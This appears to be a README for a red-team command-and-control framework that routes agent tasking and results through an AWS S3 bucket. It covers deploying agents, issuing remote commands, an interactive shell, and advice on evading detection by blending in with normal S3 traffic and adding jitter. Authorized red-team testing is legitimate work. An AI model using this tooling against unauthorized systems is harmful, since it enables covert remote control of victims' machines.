# Cloud C2 Framework

AWS S3-based Command and Control framework for red team operations.

## Features

- ✅ No server infrastructure needed (uses S3)
- ✅ Looks like legitimate cloud traffic
- ✅ Automatic session management
- ✅ Heartbeat monitoring
- ✅ Interactive shell mode
- ✅ Cost estimation tools
- ✅ Multi-region support

## Installation

```bash
# Install dependencies
pip3 install boto3

# Use directly
cd cloud/
python -m run --help

# Or install as package
pip install -e .
cloud-c2 --help
```

## Quick Start

### 1. Set Up AWS

```bash
# Create S3 bucket
aws s3 mb s3://my-c2-bucket-unique-name

# Create IAM user with S3 access
# Generate access keys
```

### 2. Deploy Agent

```bash
python -m cloud.run --agent \
  --bucket my-c2-bucket \
  --access-key AKIAIOSFODNN7EXAMPLE \
  --secret-key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY \
  --interval 60
```

### 3. Manage from Operator Console

```bash
# List sessions
python -m cloud.run --list \
  --bucket my-c2-bucket \
  --access-key KEY \
  --secret-key SECRET

# Issue command
python -m cloud.run --command "whoami" \
  --session abc123 \
  --bucket my-c2-bucket \
  --access-key KEY \
  --secret-key SECRET

# View results
python -m cloud.run --results \
  --session abc123 \
  --bucket my-c2-bucket \
  --access-key KEY \
  --secret-key SECRET
```

## Usage Examples

### Agent Operations

```bash
# Run agent with custom interval
python -m cloud.run --agent --bucket my-c2 \
  --access-key KEY --secret-key SECRET \
  --interval 120 --jitter 60

# Use different AWS region
python -m cloud.run --agent --bucket my-c2 \
  --access-key KEY --secret-key SECRET \
  --region us-west-2
```

### Operator Operations

```bash
# List all sessions with details
python -m cloud.run --list --bucket my-c2 \
  --access-key KEY --secret-key SECRET

# Get session info
python -m cloud.run --info --session abc123 \
  --bucket my-c2 --access-key KEY --secret-key SECRET

# Interactive shell
python -m cloud.run --shell --session abc123 \
  --bucket my-c2 --access-key KEY --secret-key SECRET

# Export sessions to JSON
python -m cloud.run --list --export sessions.json \
  --bucket my-c2 --access-key KEY --secret-key SECRET

# View and delete results
python -m cloud.run --results --session abc123 \
  --delete-after-read \
  --bucket my-c2 --access-key KEY --secret-key SECRET

# Cleanup specific session
python -m cloud.run --cleanup --session abc123 \
  --bucket my-c2 --access-key KEY --secret-key SECRET

# Cleanup all C2 data
python -m cloud.run --cleanup \
  --bucket my-c2 --access-key KEY --secret-key SECRET
```

### Utility Operations

```bash
# Estimate costs
python -m cloud.run --estimate-costs \
  --agents 20 --interval 60 --days 30

# Validate bucket name
python -m cloud.run --validate-bucket my-c2-bucket-name

# Generate IAM policy
python -m cloud.run --generate-policy --bucket my-c2
```

## S3 Bucket Structure

```
my-c2-bucket/
├── sessions/
│   ├── abc123.json      # Session metadata
│   └── def456.json
├── tasks/
│   ├── abc123.json      # Pending tasks (deleted when retrieved)
│   └── def456.json
├── results/
│   ├── abc123-task1.json    # Command results
│   ├── abc123-task2.json
│   └── def456-task1.json
└── heartbeats/
    ├── abc123.txt       # Last seen timestamps
    └── def456.txt
```

## Security Considerations

### AWS Security

- Use IAM users with minimal permissions
- Rotate access keys regularly
- Enable CloudTrail logging
- Use S3 bucket policies
- Enable S3 encryption at rest

### Operational Security

- Use legitimate-looking bucket names
- Mix C2 traffic with normal S3 usage
- Vary beacon intervals with jitter
- Clean up after operations
- Monitor AWS costs

### Detection Evasion

- Traffic looks identical to normal S3 usage
- No suspicious domains or IPs
- HTTPS encrypted by default
- Irregular polling patterns (jitter)
- Blends with corporate cloud usage

## Cost Management

### Estimate Costs Before Deployment

```bash
python -m cloud.run --estimate-costs \
  --agents 10 --interval 60 --days 30

# Output:
# Total cost: $0.15
# Cost per day: $0.005
```

### Cost Optimization

- Increase beacon interval (reduces requests)
- Delete results after reading (reduces storage)
- Use S3 lifecycle policies
- Monitor with AWS Cost Explorer
- Set billing alerts

## Troubleshooting

### Agent Can't Connect

```bash
# Check bucket exists
aws s3 ls s3://my-c2-bucket

# Check credentials
aws s3 ls --profile your-profile

# Check IAM permissions
aws iam get-user
```

### No Results Appearing

```bash
# Check agent is running
# Check task was created
python -m cloud.run --list --bucket my-c2 ...

# Check S3 directly
aws s3 ls s3://my-c2-bucket/results/
```

### High Costs

```bash
# Check operation counts
# Increase beacon interval
# Delete old results
# Review S3 request logs
```

## Programmatic Usage

```python
from cloud import CloudC2Agent, CloudC2Operator

# Agent
agent = CloudC2Agent('my-bucket', 'KEY', 'SECRET')
agent.run()

# Operator
operator = CloudC2Operator('my-bucket', 'KEY', 'SECRET')
sessions = operator.list_sessions()
operator.issue_command(session_id, 'whoami')
results = operator.get_results(session_id)
```

## Legal Notice

This tool is for authorized security testing only. Unauthorized access to computer systems is illegal. Always obtain written permission before testing.